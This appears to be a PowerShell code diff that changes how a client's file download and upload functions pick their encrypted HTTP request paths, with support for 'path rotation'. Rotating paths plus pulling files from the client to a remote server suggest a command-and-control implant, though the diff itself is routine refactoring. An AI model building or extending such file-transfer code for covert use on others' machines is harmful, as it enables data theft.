@@ -160,14 +160,23 @@ function Download-FileFromServer {
         # Create a web client for file request
         $webClient = New-ConfiguredWebClient
         
-        # Get current file request path
+        # Get current file request path based on rotation status
         $fileRequestPath = if ($global:pathRotationEnabled) { 
-            Get-CurrentPath -PathType "file_request_path" 
+            $path = Get-CurrentPath -PathType "file_request_path"
+            Write-Host "Using rotated file request path: $path"
+            $path
         } else { 
-            "/file_request"  # Default fallback if not defined
+            # If path rotation is disabled, use the initial path from initialization
+            $path = $global:initialPaths["file_request_path"]
+            Write-Host "Using static file request path: $path"
+            $path  # Use path from initialPaths instead of hardcoded value
         }
         
-        Write-Host "Using file request path: $fileRequestPath"
+        # If still no path, set a reasonable default but log a warning
+        if (-not $fileRequestPath) {
+            Write-Host "WARNING: No file_request_path found. Using fallback path '/file_request'"
+            $fileRequestPath = "/file_request"
+        }
         
         # Encrypt the request
         $encryptedRequest = Encrypt-Data -PlainText $requestJson
@@ -343,14 +352,23 @@ function Upload-FileToServer {
         # Create a web client for file upload
         $webClient = New-ConfiguredWebClient
         
-        # Get current file upload path - keep the existing path names for compatibility
+        # Get current file upload path based on rotation status
         $fileUploadPath = if ($global:pathRotationEnabled) { 
-            Get-CurrentPath -PathType "file_upload_path" 
+            $path = Get-CurrentPath -PathType "file_upload_path" 
+            Write-Host "Using rotated file upload path: $path"
+            $path
         } else { 
-            "/file_upload"  # Default fallback
+            # Use the initial path from global variables instead of hardcoded fallback
+            $path = $global:initialPaths["file_upload_path"]
+            Write-Host "Using static file upload path: $path"
+            $path  # Use path from initialPaths instead of hardcoded value
         }
         
-        Write-Host "Using file upload path: $fileUploadPath"
+        # If still no path, set a reasonable default but log a warning
+        if (-not $fileUploadPath) {
+            Write-Host "WARNING: No file_upload_path found. Using fallback path '/file_upload'"
+            $fileUploadPath = "/file_upload"
+        }
         
         # Prepare the payload
         $payload = @{
@@ -365,8 +383,7 @@ function Upload-FileToServer {
         
         $payloadJson = ConvertTo-Json -InputObject $payload -Compress
         
-        # Send the upload - note that we're using the file_upload path but the server treats this as
-        # uploading TO server (downloading FROM client perspective)
+        # Send the upload to the server
         $uploadUrl = "http://$serverAddress$fileUploadPath"
         Write-Host "Sending file upload to $uploadUrl"
         
